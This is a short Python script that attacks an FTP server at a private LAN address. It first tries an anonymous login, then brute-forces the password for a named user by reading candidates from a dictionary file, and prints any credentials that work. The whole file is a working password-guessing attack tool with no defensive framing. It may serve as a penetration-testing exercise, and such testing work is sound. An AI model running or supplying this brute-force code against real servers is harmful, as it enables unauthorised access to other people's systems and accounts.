#!/usr/bin/env python
# -*- coding: utf-8 -*-

import ftplib
 

def connect(host, user, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        ftp.quit()
        return True
    except:
        return False


def main():
    # VARIABLES
    targetHostAddr = '192.168.1.15'
    userName = 'gus'
    passwordsFilePath = 'passwords.txt'

    # Try to connect using anonymous credentials
    print ('\nUsing anonymous credentials for ' + targetHostAddr)

    if connect(targetHostAddr, 'anonymous', 'test@test.com'):
        print ('★ FTP Anonymous log on succeeded on host ' + targetHostAddr)
    else:
        print ('✖ FTP Anonymous log on failed on host ' + targetHostAddr)

        # Try brute force using dictionary file
        print ('\nUsing brute force with dictionary at: ' + passwordsFilePath)

        # Open passwords dictionary file
        passwordsFile = open(passwordsFilePath, 'r')

        for line in passwordsFile:
            # Clean the lines in the dictionary file
            # TODO: Store them in a different format and read in bacthes to avoid reading from
            # the file too often...
            password = line.strip('\r').strip('\n')

            print ('- Testing: ' + str(password))

            if connect(targetHostAddr, userName, password):
                # Password found!
                print ('★ FTP Logon succeeded on host ' + targetHostAddr)
                print ('    USER: ' + userName)
                print ('    PASS: ' + password)
                exit(0)
            else:
                print ('✖ FTP Logon failed')

        print ('\nI\'m sorry man...')



if __name__ == '__main__':
    main()
